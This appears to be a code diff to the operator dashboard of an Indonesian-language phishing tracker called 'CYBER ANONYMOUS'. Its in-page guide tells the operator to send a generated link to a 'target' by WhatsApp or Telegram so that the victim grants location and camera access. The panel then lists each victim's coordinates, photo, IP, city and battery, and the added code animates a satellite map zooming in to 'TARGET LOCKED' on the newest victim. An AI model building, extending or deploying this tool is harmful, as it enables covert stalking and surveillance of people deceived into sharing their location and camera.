@@ -4,6 +4,11 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>CYBER ANONYMOUS // DASHBOARD</title>
+
+  <!-- Leaflet untuk peta animasi -->
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -89,6 +94,7 @@
       justify-content: space-between;
       align-items: center;
       gap: 10px;
+      flex-wrap: wrap;
     }
     .user-info { font-size: 12px; letter-spacing: 1px; color: #7dfcce; }
     .user-info b { color: #00ff9d; text-shadow: 0 0 8px #00ff9d; }
@@ -166,9 +172,139 @@
     .btn-copy:hover { box-shadow: 0 0 20px #00ff9d; transform: scale(1.02); }
     .btn-copy.copied { background: #00d4ff; }
 
-    /* ================================================
-       KARTU IDENTITAS TARGET (WANTED STYLE)
-       ================================================ */
+    /* ============================================
+       PETA ANIMASI
+       ============================================ */
+    .map-box {
+      position: relative;
+      width: 100%;
+      height: 350px;
+      border-radius: 8px;
+      overflow: hidden;
+      border: 2px solid #00ff9d;
+      box-shadow: 0 0 20px rgba(0,255,157,0.5), inset 0 0 20px rgba(0,255,157,0.1);
+      margin-bottom: 12px;
+      background: #000;
+    }
+    #map {
+      width: 100%;
+      height: 100%;
+      background: #000;
+    }
+    .leaflet-tile-pane {
+      filter: hue-rotate(75deg) saturate(1.3) brightness(0.7) contrast(1.15);
+    }
+    .map-overlay {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: 
+        linear-gradient(rgba(0,255,157,0.06) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,157,0.06) 1px, transparent 1px);
+      background-size: 20px 20px;
+      z-index: 400;
+    }
+    .map-scanline {
+      position: absolute;
+      inset: 0;
+      pointer-events: none;
+      background: repeating-linear-gradient(
+        0deg,
+        transparent 0px,
+        transparent 2px,
+        rgba(0,255,157,0.08) 2px,
+        rgba(0,255,157,0.08) 3px
+      );
+      z-index: 401;
+    }
+    .map-crosshair {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 44px;
+      height: 44px;
+      border: 2px solid #00ff9d;
+      border-radius: 50%;
+      z-index: 500;
+      pointer-events: none;
+      box-shadow: 0 0 20px #00ff9d, inset 0 0 10px #00ff9d;
+      animation: crosshairPulse 1.5s infinite;
+    }
+    .map-crosshair::before,
+    .map-crosshair::after {
+      content: '';
+      position: absolute;
+      background: #00ff9d;
+      box-shadow: 0 0 5px #00ff9d;
+    }
+    .map-crosshair::before {
+      top: 50%; left: -14px; right: -14px;
+      height: 1px;
+      transform: translateY(-50%);
+    }
+    .map-crosshair::after {
+      left: 50%; top: -14px; bottom: -14px;
+      width: 1px;
+      transform: translateX(-50%);
+    }
+    @keyframes crosshairPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+      50% { transform: translate(-50%, -50%) scale(1.25); opacity: 0.7; }
+    }
+
+    .map-status {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: rgba(10,20,30,0.9);
+      border: 1px solid #00ff9d;
+      padding: 5px 10px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 10px;
+      color: #00ff9d;
+      letter-spacing: 1.5px;
+      z-index: 600;
+      text-shadow: 0 0 5px #00ff9d;
+    }
+    .map-status::before {
+      content: '◉ ';
+      animation: blink 1s infinite;
+    }
+    .map-coords {
+      position: absolute;
+      bottom: 10px;
+      left: 10px;
+      background: rgba(10,20,30,0.9);
+      border: 1px solid #00ff9d;
+      padding: 5px 10px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 10px;
+      color: #7dfcce;
+      letter-spacing: 1px;
+      z-index: 600;
+    }
+    .map-zoom {
+      position: absolute;
+      bottom: 10px;
+      right: 10px;
+      background: rgba(10,20,30,0.9);
+      border: 1px solid #00ff9d;
+      padding: 5px 10px;
+      border-radius: 3px;
+      font-family: 'Courier New', monospace;
+      font-size: 10px;
+      color: #00ff9d;
+      letter-spacing: 1px;
+      z-index: 600;
+      text-shadow: 0 0 5px #00ff9d;
+    }
+
+    /* ============================================
+       KARTU IDENTITAS TARGET
+       ============================================ */
     .card-target {
       margin-top: 12px;
       background: linear-gradient(135deg, rgba(10,20,30,0.95) 0%, rgba(0,40,25,0.95) 100%);
@@ -185,31 +321,17 @@
     .card-target::before {
       content: 'TARGET IDENTIFIED';
       position: absolute;
-      top: 8px;
-      right: -30px;
+      top: 10px;
+      right: -32px;
       background: #ff3366;
       color: #fff;
       font-size: 8px;
-      padding: 3px 35px;
+      padding: 3px 38px;
       transform: rotate(35deg);
       font-weight: bold;
       letter-spacing: 1.5px;
       box-shadow: 0 0 10px #ff3366;
       z-index: 3;
-    }
-    .card-target::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: 
-        repeating-linear-gradient(
-          0deg,
-          transparent 0px,
-          transparent 3px,
-          rgba(0,255,157,0.03) 3px,
-          rgba(0,255,157,0.03) 4px
-        );
-      pointer-events: none;
     }
 
     .card-top {
@@ -224,9 +346,7 @@
       margin-bottom: 12px;
       text-shadow: 0 0 5px #00ff9d;
     }
-    .card-top .id-code {
-      color: #7dfcce;
-    }
+    .card-top .id-code { color: #7dfcce; }
 
     .card-photo-wrap {
       position: relative;
@@ -333,7 +453,6 @@
       text-shadow: 0 0 5px #00d4ff;
     }
 
-    /* Baterai bar versi cyber */
     .battery-bar {
       display: inline-block;
       width: 50px;
@@ -362,7 +481,6 @@
     .battery-fill.low { background: #ff3366; box-shadow: 0 0 5px #ff3366; }
     .battery-fill.mid { background: #ffcc00; box-shadow: 0 0 5px #ffcc00; }
 
-    /* Footer kartu */
     .card-footer {
       display: flex;
       justify-content: space-between;
@@ -380,7 +498,6 @@
       animation: blink 2s infinite;
     }
 
-    /* Tombol aksi di kartu */
     .card-actions {
       display: flex;
       gap: 6px;
@@ -465,7 +582,6 @@
     }
     @keyframes blink { 50% { opacity: 0.3; } }
 
-    /* Panduan gaya cyber */
     .panduan-list {
       display: flex;
       flex-direction: column;
@@ -516,6 +632,23 @@
       background: rgba(0,255,157,0.15);
       box-shadow: 0 0 10px rgba(0,255,157,0.5);
     }
+
+    /* Leaflet popup style */
+    .leaflet-popup-content-wrapper {
+      background: #00ff9d;
+      border-radius: 6px;
+      box-shadow: 0 0 20px #00ff9d;
+    }
+    .leaflet-popup-tip {
+      background: #00ff9d;
+      box-shadow: 0 0 20px #00ff9d;
+    }
+    .leaflet-popup-content {
+      margin: 8px 12px;
+    }
+    .leaflet-container {
+      background: #000 !important;
+    }
   </style>
 </head>
 <body>
@@ -526,14 +659,12 @@
       <button id="logout" onclick="logout()">LOGOUT</button>
     </div>
 
-    <!-- OPERATOR -->
     <div class="box">
       <div class="box-title">» OPERATOR</div>
       <div class="user-info">USER: <b id="u"></b></div>
       <div class="status">CONNECTED</div>
     </div>
 
-    <!-- PANDUAN -->
     <div class="box" id="panduanBox">
       <div class="box-title">» PANDUAN OPERASI</div>
       <div class="panduan-list">
@@ -541,14 +672,13 @@
         <div class="panduan-row"><span class="pico">2️⃣</span><span class="ptxt">Klik <b>GENERATE</b>, lalu klik <b>📋 SALIN LINK</b></span></div>
         <div class="panduan-row"><span class="pico">3️⃣</span><span class="ptxt">Kirim link ke target via WhatsApp, Telegram, dll</span></div>
         <div class="panduan-row"><span class="pico">4️⃣</span><span class="ptxt">Target buka link → <b>Allow</b> lokasi & kamera</span></div>
-        <div class="panduan-row"><span class="pico">5️⃣</span><span class="ptxt">Data masuk otomatis di panel <b>INCOMING DATA</b></span></div>
+        <div class="panduan-row"><span class="pico">5️⃣</span><span class="ptxt">Peta animasi otomatis + data masuk di bawah</span></div>
       </div>
       <button class="btn-close-panduan" onclick="document.getElementById('panduanBox').style.display='none'">
         ✕ TUTUP PANDUAN
       </button>
     </div>
 
-    <!-- GENERATE LINK -->
     <div class="box">
       <div class="box-title">» GENERATE TRACKING LINK</div>
       <div class="label">TARGET NAME:</div>
@@ -565,7 +695,6 @@
       </div>
     </div>
 
-    <!-- INCOMING DATA -->
     <div class="box">
       <div class="box-title">
         » INCOMING DATA
@@ -667,7 +796,8 @@ window.downloadCard = async (key) => {
       backgroundColor: '#0a0e14',
       scale: 2,
       useCORS: true,
-      allowTaint: true
+      allowTaint: true,
+      ignoreElements: (el) => el.classList && el.classList.contains('leaflet-container')
     });
 
     const link = document.createElement('a');
@@ -698,7 +828,6 @@ function batteryBar(level) {
 }
 
 function generateID(waktu) {
-  // Buat ID unik dari timestamp
   const t = new Date(waktu);
   const y = t.getFullYear().toString().slice(-2);
   const m = String(t.getMonth()+1).padStart(2,'0');
@@ -709,19 +838,36 @@ function generateID(waktu) {
   return `TGT-${y}${m}${d}-${h}${mn}${s}`;
 }
 
+let currentMap = null;
+let currentMarker = null;
+
 onValue(ref(db, 'lokasi/' + user), snap => {
   const data = snap.val();
   if (!data) {
     document.getElementById('hasil').innerHTML = '<span class="empty">Waiting for data...</span>';
+    if (currentMap) { try { currentMap.remove(); } catch(e){} currentMap = null; }
     return;
   }
   const arr = Object.entries(data).sort((a,b) => b[1].waktu - a[1].waktu);
-  document.getElementById('hasil').innerHTML = arr.map(([key, d]) => `
+
+  document.getElementById('hasil').innerHTML = arr.map(([key, d], index) => `
     <div class="card-target" id="card-${key}">
       <div class="card-top">
         <span>ID: <span class="id-code">${generateID(d.waktu)}</span></span>
         <span>${new Date(d.waktu).toLocaleString('id-ID')}</span>
       </div>
+
+      ${d.lat && index === 0 ? `
+        <div class="map-box" id="map-${key}">
+          <div id="map"></div>
+          <div class="map-overlay"></div>
+          <div class="map-scanline"></div>
+          <div class="map-crosshair"></div>
+          <div class="map-status">SCANNING TARGET</div>
+          <div class="map-coords" id="coords-${key}">${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</div>
+          <div class="map-zoom" id="zoom-${key}">ZOOM: 2</div>
+        </div>
+      ` : ''}
 
       ${d.foto ? `
         <div class="card-photo-wrap">
@@ -739,8 +885,6 @@ onValue(ref(db, 'lokasi/' + user), snap => {
       <div class="card-data">
         ${d.lat ? `
           <div class="card-row"><span class="cico">📍</span><span class="clbl">Lokasi</span><span class="cval">${d.kota || ''} ${d.lat.toFixed(4)}, ${d.lng.toFixed(4)}</span></div>
-        ` : ''}
-        ${d.lat ? `
           <div class="card-row"><span class="cico">🗺️</span><span class="clbl">Maps</span><span class="cval"><a href="https://www.google.com/maps?q=${d.lat},${d.lng}" target="_blank">BUKA GOOGLE MAPS →</a></span></div>
         ` : ''}
         ${d.ip ? `<div class="card-row"><span class="cico">🌐</span><span class="clbl">IP</span><span class="cval">${d.ip}</span></div>` : ''}
@@ -766,7 +910,115 @@ onValue(ref(db, 'lokasi/' + user), snap => {
       </div>
     </div>
   `).join('');
+
+  // ============================================
+  // 🗺️ JALANKAN ANIMASI PETA UNTUK DATA TERBARU
+  // ============================================
+  const terbaru = arr[0][1];
+  if (terbaru && terbaru.lat && document.getElementById('map')) {
+    setTimeout(() => initMapAnimation(terbaru.lat, terbaru.lng, arr[0][0]), 200);
+  }
 });
+
+// ============================================
+// 🗺️ FUNGSI ANIMASI PETA — AUTO PLAY
+// ============================================
+function initMapAnimation(lat, lng, key) {
+  if (currentMap) {
+    try { currentMap.remove(); } catch(e) {}
+    currentMap = null;
+  }
+
+  // Buat peta — LOCKED (tidak bisa interaksi selama animasi)
+  currentMap = L.map('map', {
+    zoomControl: false,
+    attributionControl: false,
+    dragging: false,
+    scrollWheelZoom: false,
+    doubleClickZoom: false,
+    boxZoom: false,
+    keyboard: false,
+    tap: false,
+    touchZoom: false
+  }).setView([0, 20], 2);
+
+  // Layer satelit
+  L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
+    maxZoom: 18
+  }).addTo(currentMap);
+
+  const zoomEl = document.getElementById('zoom-' + key);
+  const statusEl = document.querySelector('.map-status');
+  const coordsEl = document.getElementById('coords-' + key);
+
+  // 7 stage animasi
+  const stages = [
+    { zoom: 2,  center: [0, 20],     durasi: 1200, label: 'SATELIT ONLINE' },
+    { zoom: 3,  center: [10, 30],    durasi: 1000, label: 'MENCARI SINYAL...' },
+    { zoom: 5,  center: [lat, lng],  durasi: 1200, label: 'SINYAL DITEMUKAN' },
+    { zoom: 8,  center: [lat, lng],  durasi: 1000, label: 'MENGUNCI WILAYAH...' },
+    { zoom: 11, center: [lat, lng],  durasi: 1000, label: 'MEMPERBESAR...' },
+    { zoom: 14, center: [lat, lng],  durasi: 1000, label: 'HAMPIR SELESAI...' },
+    { zoom: 16, center: [lat, lng],  durasi: 1200, label: 'TARGET TERKUNCI' }
+  ];
+
+  let idx = 0;
+
+  function playStage() {
+    if (idx >= stages.length) {
+      const targetIcon = L.divIcon({
+        html: `
+          <div style="
+            width: 24px; height: 24px;
+            background: #00ff9d;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #00ff9d, 0 0 40px #00ff9d, 0 0 60px #00ff9d;
+            border: 3px solid #fff;
+            animation: pulse 1.2s infinite;
+          "></div>
+        `,
+        className: '',
+        iconSize: [24, 24],
+        iconAnchor: [12, 12]
+      });
+
+      currentMarker = L.marker([lat, lng], { icon: targetIcon }).addTo(currentMap);
+      currentMarker.bindPopup(`
+        <div style="font-family: 'Courier New', monospace; color: #0a0e14; text-align: center; padding: 4px;">
+          <b style="color: #00c853; font-size: 13px;">◉ TARGET LOCKED</b><br>
+          <span style="font-size: 11px;">${lat.toFixed(5)}, ${lng.toFixed(5)}</span>
+        </div>
+      `).openPopup();
+
+      if (statusEl) statusEl.innerText = '◉ TARGET LOCKED';
+      if (zoomEl) zoomEl.innerText = 'ZOOM: 16';
+
+      // Unlock peta setelah animasi selesai
+      currentMap.dragging.enable();
+      currentMap.scrollWheelZoom.enable();
+      currentMap.doubleClickZoom.enable();
+      currentMap.touchZoom.enable();
+
+      return;
+    }
+
+    const s = stages[idx];
+    if (zoomEl) zoomEl.innerText = 'ZOOM: ' + s.zoom;
+    if (statusEl && s.label) statusEl.innerText = '◉ ' + s.label;
+    if (coordsEl) coordsEl.innerText = `${lat.toFixed(4)}, ${lng.toFixed(4)}`;
+
+    currentMap.flyTo(s.center, s.zoom, {
+      duration: s.durasi / 1000,
+      easeLinearity: 0.2,
+      noMoveStart: true
+    });
+
+    idx++;
+    setTimeout(playStage, s.durasi + 100);
+  }
+
+  setTimeout(playStage, 500);
+}
 </script>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
